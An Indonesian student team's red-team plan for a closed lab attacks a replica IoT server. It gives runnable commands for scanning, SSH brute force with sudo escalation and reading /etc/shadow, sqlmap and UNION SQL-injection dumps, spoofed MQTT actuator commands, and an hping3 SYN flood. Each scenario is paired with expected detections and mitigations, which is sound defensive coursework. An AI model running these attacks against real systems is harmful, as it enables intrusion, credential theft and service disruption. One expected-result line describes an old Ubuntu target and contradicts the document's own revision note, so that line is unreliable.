# Red Team Attack Plan — Fase 2 (Minggu 10–11)

**Kelompok 4 · TEK1314 Kelas A · Target Node replika:** `192.168.4.5` (Ubuntu Server LTS 26.04)
**Attacker Node:** `192.168.4.100` (Kali Linux) · **Monitoring:** `192.168.4.200` (Security Onion)
**Penyusun:** Red Team — Raka Syauqi Ferdian (J0404241112), Zidan

Dokumen ini memenuhi Bagian IX panduan: **≥3 skenario, ≥2 kategori berbeda**, DoS maksimal
satu skenario, tools disebut eksplisit sejak tahap rencana, dan setiap skenario dikaitkan
dengan celah nyata hasil riset Minggu 4.

## 0. Rules of Engagement

| Aturan | Isi |
|---|---|
| Cakupan | Hanya `192.168.4.0/24` di jaringan lab tertutup. **Tidak ada** scanning/eksploitasi ke sistem Mitra atau internet. |
| Izin | Lead mencatat persetujuan tertulis (commit/chat) sebelum eksekusi; snapshot VM diambil sebelum tiap sesi. |
| Batas availability | DoS hanya RT-05, durasi ≤60 detik, satu service, satu IP. |
| Data | Data hasil dump DB tidak berisi data pribadi nyata (data sintetis); screenshot disensor untuk NIM/password. |
| Rollback | Snapshot `before-rt0X` dipulihkan setelah tiap skenario agar baseline hardening konsisten. |
| Etika | Semua temuan dilaporkan ke Blue Team lewat `docs/purple-team-log.md`, bukan dipublikasikan. |

## 1. Ringkasan skenario

| ID | Kategori (Bagian IX) | Teknik | Tools | Target | Ekspektasi hasil |
|---|---|---|---|---|---|
| RT-01 | Reconnaissance | Port/service scan + OS fingerprinting + enumerasi banner | `nmap`, `whatweb`, Wireshark | `192.168.4.5` | Peta port lengkap; identifikasi nginx, MariaDB, Mosquitto, OpenSSH sebagai kandidat |
| RT-02 | Exploitation / Akses | Brute-force kredensial lemah → login SSH → eskalasi sudo | `hydra`, Metasploit (`auxiliary/scanner/ssh/ssh_login`) | `192.168.4.5:22` (→ `:2222` setelah A-3) | Login sebagai `iotadmin`, `sudo -l` penuh → kompromi server backend |
| RT-03 | Web/API/Protokol IoT | SQL injection pada endpoint data sensor (dashboard DVWA) | sqlmap, Burp Suite | `http://192.168.4.5/iot-dashboard/`, `:80` | Dump tabel `users` + `sensor_readings` → kebocoran data operasional |
| RT-04 | Web/API/Protokol IoT | MQTT topic hijack / spoof publish ke topik aktuator (kondisional, butuh broker 1883) | mosquitto_pub, MQTT Explorer | `192.168.4.5:1883` | Perintah palsu "pompa ON" diterima broker tanpa autentikasi |
| RT-05 | Availability (maks. 1) | SYN flood sederhana pada layanan web | hping3 | `192.168.4.5:80` | Dashboard tidak dapat diakses selama serangan |

Kategori terpakai: **4 dari 5** (Recon, Exploitation, Web/API/IoT, Availability). Sesuai
ketentuan, Availability hanya 1 dari 5.

> **Revisi Minggu 9:** Target Node kini **Ubuntu Server LTS 26.04** (bukan Metasploitable2) agar
> replika menyerupai backend IoT dan `ufw`/`fail2ban`/`apt` berfungsi. Kelemahan yang diuji
dipasang sengaja — daftarnya di `docs/design/replica_setup.md` Bagian 3.

## 2. RT-01 · Reconnaissance (pemetaan permukaan serangan)

**Kaitan riset Minggu 4 + setup replika:** target membuka 22 (OpenSSH), 80 (nginx + PHP +
DVWA), 3306 (MariaDB), 1883 (Mosquitto). Celahnya bukan versi usang, melainkan konfigurasi yang
sengaja dibuat lemah (kredensial, SQLi, MQTT tanpa auth) — rincian di `docs/design/replica_setup.md`.

```bash
# 1. host discovery + full TCP scan + versi + OS fingerprint
nmap -sS -p- -T4 --min-rate 1000 192.168.4.5 -oA rt01_fulltcp
nmap -sV -sC -O --osscan-guess -p21,22,23,25,80,139,445,3306,5432,8180 192.168.4.5 -oA rt01_services
# 2. enumerasi banner web & user
whatweb -a 3 http://192.168.4.5/
nmap --script http-enum,ftp-anon,mysql-info -p21,80,3306 192.168.4.5
# 3. tangkap trafik scan untuk validasi deteksi
sudo tcpdump -i eth0 -w rt01_scan.pcap host 192.168.4.5
```

**Hasil yang diharapkan:** 20+ port terbuka; versi service teridentifikasi; OS Linux 2.6
(Ubuntu 8.04) terdeteksi dari TTL/tcp fingerprint.
**Deteksi yang diharapkan Blue Team:** alert "port scan" dari Zeek (`Notice::Port_Scan`) /
Suricata ET SCAN; lonjakan koneksi SYN ke banyak port dalam <60 detik.
**Mitigasi yang akan diuji (checklist):** B-1, B-2 (pengurangan port terbuka & filtered).

## 3. RT-02 · Exploitation — kredensial lemah & eskalasi di server backend

**Kaitan riset Minggu 4:** target menjalankan SSH dengan autentikasi password dan user
manajemen `iotadmin` dengan password lemah (kelemahan disengaja #1, lihat
`docs/design/replica_setup.md`). Ini merepresentasikan kesalahan paling umum di backend IoT
nyata: kredensial default/lemah pada layanan manajemen, bukan exploit eksotis.

```bash
# 1. brute-force SSH dengan wordlist (skala lab, terbatas)
hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f -V
# catatan: setelah A-3 diterapkan, port = 2222 -> tambahkan -s 2222

# 2. bila kredensial ditemukan, masuk dan ukur dampak
ssh iotadmin@192.168.4.5
id; hostname; uname -a
sudo -l                      # harapan: user punya sudo -> eskalasi ke root
sudo cat /etc/shadow | head -3
mysql -u iotadmin -p iot_db -e "SELECT * FROM sensor_readings LIMIT 5;"
# alternatif Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.4.5; \
  set USERNAME iotadmin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

**Hasil yang diharapkan:** login berhasil sebagai `iotadmin`, `sudo -l` menunjukkan hak sudo
penuh → penyerang menguasai server backend (bisa mengubah data sensor, mematikan layanan, dan
memalsukan perintah aktuator).
**Deteksi yang diharapkan:** `auth.log` berisi `Failed password` berulang diikuti
`Accepted password`; Zeek `conn.log` menunjukkan banyak koneksi singkat ke port 22/2222;
Suricata ET SCAN/brute-force (bila rule aktif).
**Mitigasi yang akan diuji:** A-2 (key-only), A-4 (fail2ban), B-3 (password kuat), A-1
(no root login).
**Tahap 5 (verifikasi):** ulangi hydra → ditolak/ter-ban; login password gagal; `sudo -l` tidak
lagi memberi hak penuh (user tidak masuk grup sudo).

## 4. RT-03 · Web/API — SQL injection pada endpoint data sensor

**Kaitan riset Minggu 4:** DVWA level *low* membiarkan parameter `id` masuk langsung ke query
`SELECT first_name, last_name FROM users WHERE user_id = '$id'`. Di replika, query yang sama
dipakai endpoint `api/sensor` pada dashboard monitoring.

```bash
# 1. konfirmasi manual
curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1'&Submit=Submit"      # error SQL
curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
# 2. otomatisasi dump
sqlmap -u "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<sesi-valid>; security=low" --batch --dbs --dump -T users
sqlmap -u "http://192.168.4.5/pbl/api.php?id=1" --batch --technique=BEU --level=3 --risk=2
# 3. alternatif GUI (bukti untuk slide)
burpsuite  # Repeater: modifikasi id=1 -> id=1 UNION SELECT user,password FROM users
```

**Hasil yang diharapkan:** dump `users` (username + hash password) dan `sensor_readings`;
setara "pencurian data operasional" yang menjadi ancaman utama pada skenario SOC.
Hash kemudian diuji dengan `hashcat -m 0 hashes.txt rockyou.txt` untuk menunjukkan eskalasi.
**Deteksi yang diharapkan:** Suricata ET WEB_SERVER SQL injection / generic SQLi pattern;
Zeek `http.log` dengan URI mengandung `UNION`, `'`, `OR 1=1`; lonjakan respons error 500.
**Mitigasi yang akan diuji:** C-2 (prepared statement), C-3 (least privilege DB), B-2 (batasi
akses 3306 hanya dari monitoring).
**Tahap 5 (verifikasi):** `sqlmap --batch` ulang → `parameter does not seem to be injectable`;
payload manual menghasilkan respons normal, bukan error SQL.

## 5. RT-04 · MQTT topic hijack / spoof publish (Web/API/Protokol IoT)

**Kaitan riset Minggu 4:** replika belum punya broker MQTT; protokol inilah yang membuat
skenario benar-benar IoT. Pada Fase 2 dipasang Mosquitto di `192.168.4.5:1883` dengan
konfigurasi awal **tanpa autentikasi** (meniru kesalahan umum gateway IoT), lalu diuji.

```bash
# instalasi replika (dijalankan Blue Team sebelum skenario)
sudo apt-get install -y mosquitto mosquitto-clients
# konfigurasi awal sengaja permisif: allow_anonymous true

# redshift: dengarkan seluruh topik
mosquitto_sub -h 192.168.4.5 -t '#' -v
# spoofing perintah aktuator (pompa ON palsu)
mosquitto_pub -h 192.168.4.5 -t 'aktuator/pompa' -m '{"cmd":"ON","src":"attacker"}'
# injeksi data sensor palsu (memanipulasi pembacaan dashboard)
mosquitto_pub -h 192.168.4.5 -t 'sensor/soil/data' -m '{"moisture":99,"ts":"2026-10-20T10:00:00Z"}'
```

**Hasil yang diharapkan:** broker menerima publish tanpa kredensial; dashboard menampilkan
nilai sensor palsu dan aktuator berubah status → bukti bahwa "perintah fisik" dapat dipalsukan
tanpa menyentuh jaringan sensor.
**Deteksi yang diharapkan:** belum ada signature MQTT bawaan di Security Onion → Blue Team
wajib membuat rule kustom: alert bila ada `CONNECT` dari IP selain gateway (`192.168.4.100`)
atau `PUBLISH` ke `aktuator/#` dari luar service otomasi.
**Mitigasi yang akan diuji:** C-2 (ACL topik + `allow_anonymous false`), A-2 (kredensial
gateway), B-2 (ufw batasi 1883 hanya gateway).
**Tahap 5 (verifikasi):** `mosquitto_pub` tanpa kredensial → `Connection Refused: not authorized`;
dengan user gateway ke topik `aktuator/#` → `Not authorized`.

## 6. RT-05 · Availability — SYN flood terkontrol (maks. 1 skenario)

```bash
# 60 detik, satu service, satu target
sudo timeout 60 hping3 -S --flood -V -p 80 192.168.4.5
# pengukuran dampak dari host lain
for i in $(seq 1 20); do curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://192.168.4.5/; sleep 1; done
```

**Hasil yang diharapkan:** respons dashboard melambat/timeout selama serangan; setelah 60 detik
pulih (tidak ada kerusakan permanen).
**Deteksi yang diharapkan:** Suricata ET DOS / SYN flood; Zeek `conn.log` menunjukkan ribuan
koneksi `S0` (SYN tanpa ACK) dari satu sumber.
**Mitigasi yang akan diuji:** rate limit `iptables -m limit` per source IP + `ufw limit 80/tcp`,
serta `syncookies`.
**Tahap 5 (verifikasi):** ulangi hping3 → paket di-drop, `curl` tetap 200 OK; alert rate-limit
muncul di log.

## 7. Peta skenario → deteksi → kontrol mitigasi

| Skenario | Kategori | Deteksi utama (Blue Team) | Kontrol penutup (checklist) |
|---|---|---|---|
| RT-01 | Reconnaissance | Zeek `Port_Scan`, Suricata ET SCAN | B-1, B-2 |
| RT-02 | Exploitation | `auth.log` (Failed → Accepted password berulang), Zeek `conn.log` | A-1, A-2, A-4, B-3 |
| RT-03 | Web/API | ET WEB_SERVER SQLi, Zeek `http.log` (URI anomali) | C-2, C-3, B-2 |
| RT-04 | Web/API/IoT | Rule kustom MQTT (publish dari IP non-gateway) | C-2, A-2, B-2 |
| RT-05 | Availability | ET DOS SYN flood, Zeek `conn.log` (S0 tinggi) | ufw limit, syncookies |

## 8. Rencana eksekusi Fase 2

| Minggu | Aktivitas | PIC | Artefak |
|---|---|---|---|
| 10 (a) | Snapshot + baseline normal (`baseline_minggu9.pcap`) | Blue | `docs/blueteam/evidence/` |
| 10 (b) | Pasang Mosquitto permisif, catat konfigurasi awal | Blue | `C2_before_*` |
| 10 (c) | RT-01 + RT-02: eksekusi & rekam | Red | `docs/redteam/evidence/rt01/`, `rt02/` |
| 10 (d) | Terapkan hardening A/B/C prioritas | Blue | file bukti after |
| 11 (a) | RT-03 + RT-04 + RT-05 pada kondisi hardening baru | Red | `rt03/`, `rt04/`, `rt05/` |
| 11 (b) | Tahap 4–5 Purple Team Loop + tulis Vulnerability Assessment Report | Blue + Red | `docs/purple-team-log.md` |

## 9. Format bukti per skenario (dipakai di `docs/redteam/evidence/<id>/`)

```
<id>_command.txt     # perintah persis yang dijalankan + timestamp
<id>_output.txt      # output teks (nmap/sqlmap/msfconsole)
<id>_screen.png      # tangkapan layar terminal
<id>_alert.png       # tangkapan layar alert Security Onion (dari Blue Team)
<id>_notes.md        # apa yang berhasil/gagal + catatan analisis
```

